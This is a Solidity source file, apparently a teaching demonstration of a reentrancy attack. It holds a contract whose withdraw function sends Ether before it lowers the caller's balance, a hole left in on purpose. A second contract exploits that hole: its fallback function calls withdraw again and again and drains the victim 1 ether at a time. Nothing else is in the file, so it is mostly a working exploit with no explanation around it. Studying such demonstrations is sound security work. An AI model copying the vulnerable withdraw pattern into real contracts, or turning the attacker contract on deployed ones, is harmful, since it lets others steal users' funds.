pragma solidity ^0.6.10;


contract VulnerableToReentrancyClone {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        
    }
    
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failure to send Eth");
        
        balances[msg.sender] -= _amount;
    }
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}





contract AttackVulnerableToReentrancy {
    VulnerableToReentrancyClone public vulnerableToReentrancy;
    
    constructor(address _vulnerableToReentrancy) public {
        vulnerableToReentrancy = VulnerableToReentrancyClone(_vulnerableToReentrancy);
    }
    
    fallback() external payable {
        if (address(vulnerableToReentrancy).balance >= 1 ether) {
            vulnerableToReentrancy.withdraw(1 ether);
        }  
    }
    
    function attack() external payable {
        vulnerableToReentrancy.deposit{value: 1 ether}();
        vulnerableToReentrancy.withdraw(1 ether); 
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
